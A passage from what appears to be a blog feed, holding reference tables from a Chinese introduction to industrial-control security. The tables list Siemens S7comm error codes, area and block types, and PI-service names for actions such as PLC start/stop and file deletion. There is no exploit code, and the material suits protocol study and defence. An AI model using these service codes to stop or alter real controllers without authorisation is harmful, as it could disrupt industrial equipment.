style="text-align:center">标头属性不正确（与运行时相关）</td></tr><tr><td style="text-align:center">0xD213</td><td style="text-align:center">SDB 太多。请注意对正在使用的模块的限制</td></tr><tr><td style="text-align:center">0xD216</td><td style="text-align:center">无效的用户程序 - 重置模块</td></tr><tr><td style="text-align:center">0xD217</td><td style="text-align:center">不允许在模块属性中指定的保护级别</td></tr><tr><td style="text-align:center">0xD218</td><td style="text-align:center">属性不正确（主动/被动）</td></tr><tr><td style="text-align:center">0xD219</td><td style="text-align:center">块长度不正确（例如，第一部分或整个块的长度不正确）</td></tr><tr><td style="text-align:center">0xD21A</td><td style="text-align:center">本地数据长度不正确或写保护错误</td></tr><tr><td style="text-align:center">0xD21B</td><td style="text-align:center">模块无法压缩或压缩早期中断</td></tr><tr><td style="text-align:center">0xD21D</td><td style="text-align:center">传输的动态项目数据量是非法的</td></tr><tr><td style="text-align:center">0xD21E</td><td style="text-align:center">无法为模块（例如 FM，CP）分配参数。系统数据无法链接</td></tr><tr><td style="text-align:center">0xD220</td><td style="text-align:center">编程语言无效。请注意对正在使用的模块的限制</td></tr><tr><td style="text-align:center">0xD221</td><td style="text-align:center">连接或路由的系统数据无效</td></tr><tr><td style="text-align:center">0xD222</td><td style="text-align:center">全局数据定义的系统数据包含无效参数</td></tr><tr><td style="text-align:center">0xD223</td><td style="text-align:center">通信功能块的实例数据块错误或超出最大背景数据块数</td></tr><tr><td style="text-align:center">0xD224</td><td style="text-align:center">SCAN 系统数据块包含无效参数</td></tr><tr><td style="text-align:center">0xD225</td><td style="text-align:center">DP 系统数据块包含无效参数</td></tr><tr><td style="text-align:center">0xD226</td><td style="text-align:center">块中发生结构错误</td></tr><tr><td style="text-align:center">0xD230</td><td style="text-align:center">块中发生结构错误</td></tr><tr><td style="text-align:center">0xD231</td><td style="text-align:center">至少有一个已加载的 OB 无法复制，因为关联的优先级不存在</td></tr><tr><td style="text-align:center">0xD232</td><td style="text-align:center">加载块的至少一个块编号是非法的</td></tr><tr><td style="text-align:center">0xD234</td><td style="text-align:center">块在指定的内存介质或作业中存在两次</td></tr><tr><td style="text-align:center">0xD235</td><td style="text-align:center">该块包含不正确的校验和</td></tr><tr><td style="text-align:center">0xD236</td><td style="text-align:center">该块不包含校验和</td></tr><tr><td style="text-align:center">0xD237</td><td style="text-align:center">您将要加载块两次，即 CPU 上已存在具有相同时间戳的块</td></tr><tr><td style="text-align:center">0xD238</td><td style="text-align:center">指定的块中至少有一个不是 DB</td></tr><tr><td style="text-align:center">0xD239</td><td style="text-align:center">至少有一个指定的 DB 在装载存储器中不可用作链接变量</td></tr><tr><td style="text-align:center">0xD23A</td><td style="text-align:center">至少有一个指定的 DB 与复制和链接的变体有很大不同</td></tr><tr><td style="text-align:center">0xD240</td><td style="text-align:center">违反了协调规则</td></tr><tr><td style="text-align:center">0xD241</td><td style="text-align:center">当前保护级别不允许该功能</td></tr><tr><td style="text-align:center">0xD242</td><td style="text-align:center">处理 F 块时的保护冲突</td></tr><tr><td style="text-align:center">0xD250</td><td style="text-align:center">更新和模块 ID 或版本不匹配</td></tr><tr><td style="text-align:center">0xD251</td><td style="text-align:center">操作系统组件序列不正确</td></tr><tr><td style="text-align:center">0xD252</td><td style="text-align:center">校验和错误</td></tr><tr><td style="text-align:center">0xD253</td><td style="text-align:center">没有可用的可执行加载程序; 只能使用存储卡进行更新</td></tr><tr><td style="text-align:center">0xD254</td><td style="text-align:center">操作系统中的存储错误</td></tr><tr><td style="text-align:center">0xD280</td><td style="text-align:center">在 S7-300 CPU 中编译块时出错</td></tr><tr><td style="text-align:center">0xD2A1</td><td style="text-align:center">块上的另一个块功能或触发器处于活动状态</td></tr><tr><td style="text-align:center">0xD2A2</td><td style="text-align:center">块上的触发器处于活动状态。首先完成调试功能</td></tr><tr><td style="text-align:center">0xD2A3</td><td style="text-align:center">块未激活（链接），块被占用或块当前被标记为删除</td></tr><tr><td style="text-align:center">0xD2A4</td><td style="text-align:center">该块已被另一个块函数处理</td></tr><tr><td style="text-align:center">0xD2A6</td><td style="text-align:center">无法同时保存和更改用户程序</td></tr><tr><td style="text-align:center">0xD2A7</td><td style="text-align:center">块具有“未链接”属性或未处理</td></tr><tr><td style="text-align:center">0xD2A8</td><td style="text-align:center">激活的调试功能阻止将参数分配给 CPU</td></tr><tr><td style="text-align:center">0xD2A9</td><td style="text-align:center">正在为 CPU 分配新参数</td></tr><tr><td style="text-align:center">0xD2AA</td><td style="text-align:center">当前正在为模块分配新参数</td></tr><tr><td style="text-align:center">0xD2AB</td><td style="text-align:center">当前正在更改动态配置限制</td></tr><tr><td style="text-align:center">0xD2AC</td><td style="text-align:center">正在运行的激活或取消激活分配（SFC 12）暂时阻止 R-KiR 过程</td></tr><tr><td style="text-align:center">0xD2B0</td><td style="text-align:center">在 RUN（CiR）中配置时发生错误</td></tr><tr><td style="text-align:center">0xD2C0</td><td style="text-align:center">已超出最大工艺对象数</td></tr><tr><td style="text-align:center">0xD2C1</td><td style="text-align:center">模块上已存在相同的技术数据块</td></tr><tr><td style="text-align:center">0xD2C2</td><td style="text-align:center">无法下载用户程序或下载硬件配置</td></tr><tr><td style="text-align:center">0xD401</td><td style="text-align:center">信息功能不可用</td></tr><tr><td style="text-align:center">0xD402</td><td style="text-align:center">信息功能不可用</td></tr><tr><td style="text-align:center">0xD403</td><td style="text-align:center">服务已登录/注销（诊断/ PMC）</td></tr><tr><td style="text-align:center">0xD404</td><td style="text-align:center">达到的最大节点数。不再需要登录诊断/ PMC</td></tr><tr><td style="text-align:center">0xD405</td><td style="text-align:center">不支持服务或函数参数中的语法错误</td></tr><tr><td style="text-align:center">0xD406</td><td style="text-align:center">当前不可用的必需信息</td></tr><tr><td style="text-align:center">0xD407</td><td style="text-align:center">发生诊断错误</td></tr><tr><td style="text-align:center">0xD408</td><td style="text-align:center">更新已中止</td></tr><tr><td style="text-align:center">0xD409</td><td style="text-align:center">DP 总线错误</td></tr><tr><td style="text-align:center">0xD601</td><td style="text-align:center">函数参数中的语法错误</td></tr><tr><td style="text-align:center">0xD602</td><td style="text-align:center">输入的密码不正确</td></tr><tr><td style="text-align:center">0xD603</td><td style="text-align:center">连接已合法化</td></tr><tr><td style="text-align:center">0xD604</td><td style="text-align:center">已启用连接</td></tr><tr><td style="text-align:center">0xD605</td><td style="text-align:center">由于密码不存在，因此无法进行合法化</td></tr><tr><td style="text-align:center">0xD801</td><td style="text-align:center">至少有一个标记地址无效</td></tr><tr><td style="text-align:center">0xD802</td><td style="text-align:center">指定的作业不存在</td></tr><tr><td style="text-align:center">0xD803</td><td style="text-align:center">非法的工作状态</td></tr><tr><td style="text-align:center">0xD804</td><td style="text-align:center">非法循环时间（非法时基或多个）</td></tr><tr><td style="text-align:center">0xD805</td><td style="text-align:center">不能再设置循环读取作业</td></tr><tr><td style="text-align:center">0xD806</td><td style="text-align:center">引用的作业处于无法执行请求的功能的状态</td></tr><tr><td style="text-align:center">0xD807</td><td style="text-align:center">功能因过载而中止，这意味着执行读取周期所需的时间比设置的扫描周期时间长</td></tr><tr><td style="text-align:center">0xDC01</td><td style="text-align:center">日期和/或时间无效</td></tr><tr><td style="text-align:center">0xE201</td><td style="text-align:center">CPU 已经是主设备</td></tr><tr><td style="text-align:center">0xE202</td><td style="text-align:center">由于闪存模块中的用户程序不同，无法进行连接和更新</td></tr><tr><td style="text-align:center">0xE203</td><td style="text-align:center">由于固件不同，无法连接和更新</td></tr><tr><td style="text-align:center">0xE204</td><td style="text-align:center">由于内存配置不同，无法连接和更新</td></tr><tr><td style="text-align:center">0xE205</td><td style="text-align:center">由于同步错误导致连接/更新中止</td></tr><tr><td style="text-align:center">0xE206</td><td style="text-align:center">由于协调违规而拒绝连接/更新</td></tr><tr><td style="text-align:center">0xEF01</td><td style="text-align:center">S7 协议错误：ID2 错误; 工作中只允许 00H</td></tr><tr><td style="text-align:center">0xEF02</td><td style="text-align:center">S7 协议错误：ID2 错误; 资源集不存在</td></tr></tbody></table><h2 id="Item-结构中-Syntax-Id-取值"><a href="#Item-结构中-Syntax-Id-取值" class="headerlink" title="Item 结构中 Syntax Id 取值"></a>Item 结构中 Syntax Id 取值</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">值</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:center">0x10</td><td style="text-align:center">S7ANY</td><td>Address data S7-Any pointer-like DB1.DBX10.2</td></tr><tr><td style="text-align:center">0x13</td><td style="text-align:center">PBC-R_ID</td><td>R_ID for PBC</td></tr><tr><td style="text-align:center">0x15</td><td style="text-align:center">ALARM_LOCKFREE</td><td>Alarm lock/free dataset</td></tr><tr><td style="text-align:center">0x16</td><td style="text-align:center">ALARM_IND</td><td>Alarm indication dataset</td></tr><tr><td style="text-align:center">0x19</td><td style="text-align:center">ALARM_ACK</td><td>Alarm acknowledge message dataset</td></tr><tr><td style="text-align:center">0x1a</td><td style="text-align:center">ALARM_QUERYREQ</td><td>Alarm query request dataset</td></tr><tr><td style="text-align:center">0x1c</td><td style="text-align:center">NOTIFY_IND</td><td>Notify indication dataset</td></tr><tr><td style="text-align:center">0xa2</td><td style="text-align:center">DRIVEESANY</td><td>seen on Drive ES Starter with routing over S7</td></tr><tr><td style="text-align:center">0xb2</td><td style="text-align:center">1200SYM</td><td>Symbolic address mode of S7-1200</td></tr><tr><td style="text-align:center">0xb0</td><td style="text-align:center">DBREAD</td><td>Kind of DB block read, seen only at an S7-400</td></tr><tr><td style="text-align:center">0x82</td><td style="text-align:center">NCK</td><td>Sinumerik NCK HMI access</td></tr></tbody></table><h2 id="Item-结构中-Transport-size-取值"><a href="#Item-结构中-Transport-size-取值" class="headerlink" title="Item 结构中 Transport size 取值"></a>Item 结构中 Transport size 取值</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">NULL</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">BIT</td><td style="text-align:center">bit access, len is in bits</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">BYTE/WORD/DWORD</td><td style="text-align:center">byte/word/dword access, len is in bits</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">INTEGER</td><td style="text-align:center">integer access, len is in bits</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">DINTEGER</td><td style="text-align:center">integer access, len is in bytes</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">REAL</td><td style="text-align:center">real access, len is in bytes</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">OCTET STRING</td><td style="text-align:center">octet string, len is in bytes</td></tr></tbody></table><h2 id="Item-结构中-Area-取值"><a href="#Item-结构中-Area-取值" class="headerlink" title="Item 结构中 Area 取值"></a>Item 结构中 Area 取值</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">Value</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0x03</td><td style="text-align:center">System info of 200 family</td><td style="text-align:center">200 系列系统信息</td></tr><tr><td style="text-align:center">0x05</td><td style="text-align:center">System flags of 200 family</td><td style="text-align:center">200 系列系统标志</td></tr><tr><td style="text-align:center">0x06</td><td style="text-align:center">Analog inputs of 200 family</td><td style="text-align:center">200 系列模拟量输入</td></tr><tr><td style="text-align:center">0x07</td><td style="text-align:center">Analog outputs of 200 family</td><td style="text-align:center">200 系列模拟量输出</td></tr><tr><td style="text-align:center">0x80</td><td style="text-align:center">Direct peripheral access (P)</td><td style="text-align:center">直接访问外设</td></tr><tr><td style="text-align:center">0x81</td><td style="text-align:center">Inputs (I)</td><td style="text-align:center">输入（I）</td></tr><tr><td style="text-align:center">0x82</td><td style="text-align:center">Outputs (Q)</td><td style="text-align:center">输出（Q）</td></tr><tr><td style="text-align:center">0x83</td><td style="text-align:center">Flags (M)</td><td style="text-align:center">内部标志（M）</td></tr><tr><td style="text-align:center">0x84</td><td style="text-align:center">Data blocks (DB)</td><td style="text-align:center">数据块（DB）</td></tr><tr><td style="text-align:center">0x85</td><td style="text-align:center">Instance data blocks (DI)</td><td style="text-align:center">背景数据块（DI）</td></tr><tr><td style="text-align:center">0x86</td><td style="text-align:center">Local data (L)</td><td style="text-align:center">局部变量（L）</td></tr><tr><td style="text-align:center">0x87</td><td style="text-align:center">Unknown yet (V)</td><td style="text-align:center">全局变量（V）</td></tr><tr><td style="text-align:center">0x1c</td><td style="text-align:center">S7 counters (C)</td><td style="text-align:center">S7 计数器（C）</td></tr><tr><td style="text-align:center">0x1d</td><td style="text-align:center">S7 timers (T)</td><td style="text-align:center">S7 定时器（T）</td></tr><tr><td style="text-align:center">0x1e</td><td style="text-align:center">IEC counters (200 family)</td><td style="text-align:center">IEC 计数器（200 系列）</td></tr><tr><td style="text-align:center">0x1f</td><td style="text-align:center">IEC timers (200 family)</td><td style="text-align:center">IEC 定时器（200 系列）</td></tr></tbody></table><h2 id="Item-结构中-Return-code-取值"><a href="#Item-结构中-Return-code-取值" class="headerlink" title="Item 结构中 Return code 取值"></a>Item 结构中 Return code 取值</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0x00</td><td style="text-align:center">Reserved</td><td style="text-align:center">未定义，预留</td></tr><tr><td style="text-align:center">0x01</td><td style="text-align:center">Hardware error</td><td style="text-align:center">硬件错误</td></tr><tr><td style="text-align:center">0x03</td><td style="text-align:center">Accessing the object not allowed</td><td style="text-align:center">对象不允许访问</td></tr><tr><td style="text-align:center">0x05</td><td style="text-align:center">Invalid address</td><td style="text-align:center">无效地址，所需的地址超出此 PLC 的极限</td></tr><tr><td style="text-align:center">0x06</td><td style="text-align:center">Data type not supported</td><td style="text-align:center">数据类型不支持</td></tr><tr><td style="text-align:center">0x07</td><td style="text-align:center">Data type inconsistent</td><td style="text-align:center">日期类型不一致</td></tr><tr><td style="text-align:center">0x0a</td><td style="text-align:center">Object does not exist</td><td style="text-align:center">对象不存在</td></tr><tr><td style="text-align:center">0xff</td><td style="text-align:center">Success</td><td style="text-align:center">成功</td></tr></tbody></table><h2 id="西门子设备中-8-种不同类型的功能块"><a href="#西门子设备中-8-种不同类型的功能块" class="headerlink" title="西门子设备中 8 种不同类型的功能块"></a>西门子设备中 8 种不同类型的功能块</h2><table><thead><tr><th style="text-align:center">Hex</th><th style="text-align:center">类型</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0x3038</td><td style="text-align:center">OB，ASCII 为’08’，组织块</td><td style="text-align:center">OB 决定用户程序的结构</td></tr><tr><td style="text-align:center">0x3039</td><td style="text-align:center">CMod，ASCII 为’09’</td></tr><tr><td style="text-align:center">0x3041</td><td style="text-align:center">DB，ASCII 为’0A’，数据块</td><td style="text-align:center">DB 是用于存储用户数据的数据区域，除了指定给一个功能块的数据，还可以定义可以被任何块使用的共享数据</td></tr><tr><td style="text-align:center">0x3042</td><td style="text-align:center">SDB，ASCII 为’0B’，系统和数据块</td><td style="text-align:center">由编程软件自动生成主要存放 PLC 的硬件组态等信息，用户无法直接打开和更改</td></tr><tr><td style="text-align:center">0x3043</td><td style="text-align:center">FC，ASCII 为’0C’，功能</td><td style="text-align:center">FB、FC 本质都是一样的，都相当于子程序，可以被其他程序调用（也可以调用其他子程序），FC 使用的是共享数据块</td></tr><tr><td style="text-align:center">0x3044</td><td style="text-align:center">SFC，ASCII 为’0D’，系统功能</td><td style="text-align:center">SFB 和 SFC 集成在 S7 CPU 中可以让你访问一些重要的系统功能</td></tr><tr><td style="text-align:center">0x3045</td><td style="text-align:center">FB，ASCII 为’0E’，功能块，带背景数据块</td><td style="text-align:center">FB、FC 本质都是一样的，都相当于子程序，可以被其他程序调用（也可以调用其他子程序），FB 使用的是背景数据块</td></tr><tr><td style="text-align:center">0x3046</td><td style="text-align:center">SFB，ASCII 为’0F’，系统功能块</td><td style="text-align:center">SFB 和 SFC 集成在 S7 CPU 中可以让你访问一些重要的系统功能</td></tr></tbody></table><p>OB、FB、SFB、FC 和 SFC 都包含部分程序，因此也称作逻辑块。每种块类型所允许的块的数量以及块的长度视 CPU 而定。</p><h2 id="请求下载的目标文件系统类型"><a href="#请求下载的目标文件系统类型" class="headerlink" title="请求下载的目标文件系统类型"></a>请求下载的目标文件系统类型</h2><ul><li>P（Passive <em>copied, but not chained</em> module）：被动文件系统；</li><li>A（Active embedded module）：主动文件系统；</li><li>B（Active as well as passive module）：既主既被文件系统。</li></ul><h2 id="程序调用服务名"><a href="#程序调用服务名" class="headerlink" title="程序调用服务名"></a>程序调用服务名</h2><table><thead><tr><th style="text-align:center">服务名称</th><th style="text-align:center">值（描述）</th></tr></thead><tbody><tr><td style="text-align:center"><code>UNKNOWN</code></td><td style="text-align:center">PI-Service 目前不详</td></tr><tr><td style="text-align:center"><code>_INSE</code></td><td style="text-align:center">PI-Service <code>_INSE</code>（激活 PLC 模块）</td></tr><tr><td style="text-align:center"><code>_DELE</code></td><td style="text-align:center">PI-Service <code>_DELE</code>（从 PLC 的被动文件系统中删除模块）</td></tr><tr><td style="text-align:center"><code>P_PROGRAM</code></td><td style="text-align:center">PI-Service <code>P_PROGRAM</code>（PLC 启动/停止）</td></tr><tr><td style="text-align:center"><code>_MODU</code></td><td style="text-align:center">PI-Service <code>_MODU</code>（PLC Copy Ram to Rom）</td></tr><tr><td style="text-align:center"><code>_GARB</code></td><td style="text-align:center">PI-Service <code>_GARB</code>（压缩 PLC 内存）</td></tr><tr><td style="text-align:center"><code>N_LOGIN</code></td><td style="text-align:center">PI-Service <code>_N_LOGIN_</code>（登录）</td></tr><tr><td style="text-align:center"><code>_N_LOGOUT</code></td><td style="text-align:center">PI-Service <code>_N_LOGOUT</code>（退出）</td></tr><tr><td style="text-align:center"><code>_N_CANCEL</code></td><td style="text-align:center">PI-Service <code>_N_CANCEL</code>（取消 NC 报警）</td></tr><tr><td style="text-align:center"><code>_N_DASAVE</code></td><td style="text-align:center">PI-Service <code>_N_DASAVE</code>（用于将数据从 SRAM 复制到 FLASH 的 PI-Service）</td></tr><tr><td style="text-align:center"><code>_N_DIGIOF P</code></td><td style="text-align:center">I-Service <code>_N_DIGIOF</code>（关闭数字化）</td></tr><tr><td style="text-align:center"><code>_N_DIGION</code></td><td style="text-align:center">PI-Service <code>_N_DIGION</code>（打开数字化）</td></tr><tr><td style="text-align:center"><code>N_DZERO</code></td><td style="text-align:center">PI-Service <code>_N_DZERO_</code>（设置所有 D nos。对于函数无效“唯一 D 号。”）</td></tr><tr><td style="text-align:center"><code>_N_ENDEXT</code></td><td style="text-align:center">PI-Service <code>_N_ENDEXT</code></td></tr><tr><td style="text-align:center"><code>_N_F_OPER</code></td><td style="text-align:center">PI-Service <code>_N_F_OPER</code>（以只读方式打开文件）</td></tr><tr><td style="text-align:center"><code>_N_OST_OF</code></td><td style="text-align:center">PI-Service <code>_N_OST_OF</code>（Overstore OFF）</td></tr><tr><td style="text-align:center"><code>_N_OST_ON</code></td><td style="text-align:center">PI-Service <code>_N_OST_ON</code>（Overstore ON）</td></tr><tr><td style="text-align:center"><code>N_SCALE</code></td><td style="text-align:center">PI-Service <code>_N_SCALE_</code>（测量单位设置）</td></tr><tr><td style="text-align:center"><code>_N_SETUFR</code></td><td style="text-align:center">PI-Service <code>_N_SETUFR</code>（激活用户帧）</td></tr><tr><td style="text-align:center"><code>_N_STRTLK</code></td><td style="text-align:center">PI-Service <code>_N_STRTLK</code>（设置全局启动禁用）</td></tr><tr><td style="text-align:center"><code>_N_STRTUL</code></td><td style="text-align:center">PI-Service <code>_N_STRTUL</code>（重置全局启动禁用）</td></tr><tr><td style="text-align:center"><code>_N_TMRASS</code></td><td style="text-align:center">PI-Service <code>_N_TMRASS</code>（重置活动状态）</td></tr><tr><td style="text-align:center"><code>_N_F_DELE</code></td><td style="text-align:center">PI-Service <code>_N_F_DELE</code>（删除文件）</td></tr><tr><td style="text-align:center"><code>_N_EXTERN</code></td><td style="text-align:center">PI-Service <code>_N_EXTERN</code>（选择外部程序执行）</td></tr><tr><td style="text-align:center"><code>_N_EXTMOD</code></td><td style="text-align:center">PI-Service <code>_N_EXTMOD</code>（选择外部程序执行）</td></tr><tr><td style="text-align:center"><code>_N_F_DELR</code></td><td style="text-align:center">PI-Service <code>_N_F_DELR</code>（即使没有访问权限也删除文件）</td></tr><tr><td style="text-align:center"><code>_N_F_XFER</code></td><td style="text-align:center">PI-Service <code>_N_F_XFER</code>（选择要上传的文件）</td></tr><tr><td style="text-align:center"><code>N_LOCKE</code></td><td style="text-align:center">PI-Service <code>_N_LOCKE_</code>（锁定活动文件以进行编辑）</td></tr><tr><td style="text-align:center"><code>_N_SELECT</code></td><td style="text-align:center">PI-Service <code>_N_SELECT</code>（选择要执行的程序）</td></tr><tr><td style="text-align:center"><code>_N_SRTEXT</code></td><td style="text-align:center">PI-Service <code>_N_SRTEXT</code>（文件正在 <code>_N_EXT_DIR</code> 中标记）</td></tr><tr><td style="text-align:center"><code>_N_F_CLOS</code></td><td style="text-align:center">PI-Service <code>_N_F_CLOS</code>（关闭文件）</td></tr><tr><td style="text-align:center"><code>_N_F_OPEN</code></td><td style="text-align:center">PI-Service <code>_N_F_OPEN</code>（打开文件）</td></tr><tr><td style="text-align:center"><code>_N_F_SEEK</code></td><td style="text-align:center">PI-Service <code>_N_F_SEEK</code>（定位文件搜索指针）</td></tr><tr><td style="text-align:center"><code>N_ASUP_</code></td><td style="text-align:center">PI-Service <code>_N_ASUP</code>（分配中断）</td></tr><tr><td style="text-align:center"><code>_N_CHEKDM</code></td><td style="text-align:center">PI-Service <code>_N_CHEKDM</code>（对 D 号码启动唯一性检查）</td></tr><tr><td style="text-align:center"><code>_N_CHKDNO</code></td><td style="text-align:center">PI-Service <code>_N_CHKDNO</code>（检查工具是否具有唯一的 D 编号）</td></tr><tr><td style="text-align:center"><code>_N_CONFIG</code></td><td style="text-align:center">PI-Service <code>_N_CONFIG</code>（重新配置机器数据）</td></tr><tr><td style="text-align:center"><code>_N_CRCEDN</code></td><td style="text-align:center">PI-Service <code>_N_CRCEDN</code>（通过指定边数来创建切削刃）</td></tr><tr><td style="text-align:center"><code>_N_DELECE</code></td><td style="text-align:center">PI-Service <code>_N_DELECE</code>（删除最前沿）</td></tr><tr><td style="text-align:center"><code>_N_CREACE</code></td><td style="text-align:center">PI-Service <code>_N_CREACE</code>（创造最前沿）</td></tr><tr><td style="text-align:center"><code>_N_CREATO</code></td><td style="text-align:center">PI-Service <code>_N_CREATO</code>（创建工具）</td></tr><tr><td style="text-align:center"><code>_N_DELETO</code></td><td style="text-align:center">PI-Service <code>_N_DELETO</code>（删除工具）</td></tr><tr><td style="text-align:center"><code>_N_CRTOCE</code></td><td style="text-align:center">PI-Service <code>_N_CRTOCE</code>（生成具有指定边数的工具）</td></tr><tr><td style="text-align:center"><code>_N_DELVAR</code></td><td style="text-align:center">PI-Service <code>_N_DELVAR</code>（删除数据块）</td></tr><tr><td style="text-align:center"><code>_N_F_COPY</code></td><td style="text-align:center">PI-Service <code>_N_F_COPY</code>（复制 NCK 中的文件）</td></tr><tr><td style="text-align:center"><code>_N_F_DMDA</code></td><td style="text-align:center">PI-Service <code>_N_F_DMDA</code>（删除 MDA 内存）</td></tr><tr><td style="text-align:center"><code>_N_F_PROT</code></td><td style="text-align:center">PI-Service <code>_N_F_PROT</code>（为文件指定保护级别）</td></tr><tr><td style="text-align:center"><code>_N_F_RENA</code></td><td style="text-align:center">PI-Service <code>_N_F_RENA</code>（重命名文件）</td></tr><tr><td style="text-align:center"><code>_N_FINDBL</code></td><td style="text-align:center">PI-Service <code>_N_FINDBL</code>（激活搜索）</td></tr><tr><td style="text-align:center"><code>_N_IBN_SS</code></td><td style="text-align:center">PI-Service <code>_N_IBN_SS</code>（设置设置开关）</td></tr><tr><td style="text-align:center"><code>_N_MMCSEM</code></td><td style="text-align:center">PI-Service <code>_N_MMCSEM</code>（MMC-Semaphore）</td></tr><tr><td style="text-align:center"><code>_N_NCKMOD</code></td><td style="text-align:center">PI-Service <code>_N_NCKMOD</code>（正在设置 NCK 工作的模式）</td></tr><tr><td style="text-align:center"><code>_N_NEWPWD</code></td><td style="text-align:center">PI-Service <code>_N_NEWPWD</code>（新密码）</td></tr><tr><td style="text-align:center"><code>_N_SEL_BL</code></td><td style="text-align:center">PI-Service <code>_N_SEL_BL</code>（选择新块）</td></tr><tr><td style="text-align:center"><code>_N_SETTST</code></td><td style="text-align:center">PI-Service <code>_N_SETTST</code>（激活替换工具组的工具）</td></tr><tr><td style="text-align:center"><code>_N_TMAWCO</code></td><td style="text-align:center">PI-Service <code>_N_TMAWCO</code>（在一个杂志中设置有效磨损组）</td></tr><tr><td style="text-align:center"><code>_N_TMCRTC</code></td><td style="text-align:center">PI-Service <code>_N_TMCRTC</code>（创建具有指定边数的工具）</td></tr><tr><td style="text-align:center"><code>_N_TMCRTO</code></td><td style="text-align:center">PI-Service <code>_N_TMCRTO</code>（在工具管理中创建工具）</td></tr><tr><td style="text-align:center"><code>_N_TMFDPL</code></td><td style="text-align:center">PI-Service <code>_N_TMFDPL</code>（搜索空白处加载）</td></tr><tr><td style="text-align:center"><code>_N_TMFPBP</code></td><td style="text-align:center">PI-Service <code>_N_TMFPBP</code>（搜索空位）</td></tr><tr><td style="text-align:center"><code>_N_TMGETT</code></td><td style="text-align:center">PI-Service <code>_N_TMGETT</code>（使用 Duplono 确定特定工具 ID 的 T 编号）</td></tr><tr><td style="text-align:center"><code>_N_TMMVTL</code></td><td style="text-align:center">PI-Service <code>_N_TMMVTL</code>（加载或卸载工具）</td></tr><tr><td style="text-align:center"><code>_N_TMPCIT</code></td><td style="text-align:center">PI-Service <code>_N_TMPCIT</code>（设置计件器的增量值）</td></tr><tr><td style="text-align:center"><code>_N_TMPOSM</code></td><td style="text-align:center">PI-Service <code>_N_TMPOSM</code>（定位杂志或工具）</td></tr><tr><td style="text-align:center"><code>_N_TRESMO</code></td><td style="text-align:center">PI-Service <code>_N_TRESMO</code>（重置监控值）</td></tr><tr><td style="text-align:center"><code>_N_TSEARC</code></td><td style="text-align:center">PI-Service <code>_N_TSEARC</code>（通过搜索屏幕进行复杂搜索）</td></tr></tbody></table><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://wooyun.js.org/drops/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90.html</a><br><a href="https://xuanxuanblingbling.github.io/ics/2020/01/10/ics/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ics/2020/01/10/ics/</a><br><a href="https://www.cnpanda.net/sec/592.html" target="_blank" rel="noopener">https://www.cnpanda.net/sec/592.html</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/ics/ctfs-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/ics/ctfs-zh/</a><br><a href="https://www.cnpanda.net/sec/578.html" target="_blank" rel="noopener">https://www.cnpanda.net/sec/578.html</a><br><a href="https://www.bilibili.com/video/BV1Ft41177cs" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ft41177cs</a><br><a href="https://www.bilibili.com/video/BV15J411P77f" target="_blank" rel="noopener">https://www.bilibili.com/video/BV15J411P77f</a><br><a href="https://www.youtube.com/watch?v=LyzIrE6DpOM" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LyzIrE6DpOM</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;初探工控安全，主要分为协议安全、网络安全和固件安全等。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ics" scheme="blog.b3ale.cn/tags/ics/"/>
    
  </entry>
  
  <entry>
    <title>实现获取键盘中断的字符设备驱动程序</title>
    <link href="blog.b3ale.cn/2020/05/31/%E5%AE%9E%E7%8E%B0%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E4%B8%AD%E6%96%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/"/>
    <id>blog.b3ale.cn/2020/05/31/%E5%AE%9E%E7%8E%B0%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E4%B8%AD%E6%96%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/</id>
    <published>2020-05-31T11:40:43.000Z</published>
    <updated>2020-06-27T06:43:03.000Z</updated>
    
